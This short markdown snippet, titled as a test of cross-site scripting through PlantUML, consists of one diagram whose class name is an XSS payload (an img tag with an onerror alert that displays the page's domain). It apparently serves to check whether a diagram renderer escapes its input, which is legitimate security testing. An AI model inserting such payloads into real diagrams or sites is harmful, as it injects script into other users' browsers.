# Testing XSS with plantUML

```plantuml
@startuml
class "<img src=x onerror=alert('XSS_SUCCESS_DOMAIN_'+document.domain)>" as User
@enduml
